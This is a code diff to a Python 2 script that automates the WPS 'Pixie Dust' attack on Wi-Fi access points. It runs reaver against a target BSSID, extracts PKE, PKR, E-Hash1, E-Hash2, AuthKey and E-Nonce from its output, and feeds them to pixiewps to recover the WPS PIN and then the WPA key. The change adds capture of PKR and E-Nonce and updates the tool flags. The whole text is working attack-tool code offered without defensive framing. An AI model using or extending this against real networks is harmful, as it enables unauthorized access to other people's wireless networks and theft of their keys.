@@ -262,6 +262,14 @@ def reaver():
 	global bssid
 	global WPAkey
 	global WPSpin
+	global PKR
+	global PKRb
+	global Enonce
+	global Enonceb
+	PKR=""
+	PKRb=""
+	Enonce=""
+	Enonceb=""
 	WPAkey=""
 	WPApin=""
 	Cline=[]
@@ -280,7 +288,7 @@ def reaver():
 	if os.path.isfile(delsession):os.remove(delsession)
 	fout = open("fReaverOut", "w")
 	ferr = open("fReaverErrors", "w")
-	pid = Popen(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv", "-S"], stdout=fout, stderr=ferr).pid
+	pid = Popen(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv"], stdout=fout, stderr=ferr).pid
 	f = open("fReaverOut")
 	try:
 		while True:
@@ -298,6 +306,12 @@ def reaver():
 				if "E-Hash2" in line and EHash2b == "":
 					EHash2=line[line.find("E-Hash2:")+9:line.find("\n")]
 					EHash2b=len(re.sub('[^A-Za-z0-9]+', '', EHash2))/2,
+				if "PKR:" in line and PKRb == "":
+					PKR=line[line.find("PKR:")+5:line.find("\n")]
+					PKRb=len(re.sub('[^A-Za-z0-9]+', '', PKR))/2,
+				if "E-Nonce:" in line and Enonceb == "":
+					Enonce=line[line.find("E-Nonce:")+9:line.find("\n")]
+					Enonceb=len(re.sub('[^A-Za-z0-9]+', '', Enonce))/2,
 				if PKE!="" and AuthKey!="" and EHash1!="" and EHash2!="":hashing="done"
 				Cline.append (line)
 				line = f.readline()
@@ -324,7 +338,7 @@ def convPin():
 	fout = open("fReaverOut", "w")
 	ferr = open("fReaverErrors", "w")
 	pin="--pin=%s" % (WPSpin)
-	pid = Popen(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv", "-S", pin], stdout=fout, stderr=ferr).pid
+	pid = Popen(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv", pin], stdout=fout, stderr=ferr).pid
 	f = open("fReaverOut")
 	try:
 		while True:
@@ -371,9 +385,11 @@ def status():
 	print "essid:%s" % (essid)
 	print
 	print "PKE:%s" % (PKEb)
+	print "PKR:%s" % (PKRb)
 	print "Authkey:%s" % (AuthKeyb)
 	print "E-Hash1:%s" % (EHash1b)
 	print "E-Hash2:%s" % (EHash2b)
+	print "E-Nonce:%s" % (Enonceb)
 	print
 	if WPSpin:print "PIN:%s" % (WPSpin)
 	else:print "PIN:"
@@ -389,7 +405,7 @@ def pixie():
 	global WPSpin
 	fout2 = open("fPixiewpsOut", "w")
 	ferr2 = open("fPixiewpsErrors", "w")
-	runpixie=Popen(["pixiewps", "-e", PKE, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-S"], stdout=fout2, stderr=ferr2)
+	runpixie=Popen(["pixiewps", "-e", PKE, "-r", PKR, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-n", Enonce], stdout=fout2, stderr=ferr2)
 	Popen.wait(runpixie)
 
 	f = open("fPixiewpsOut")
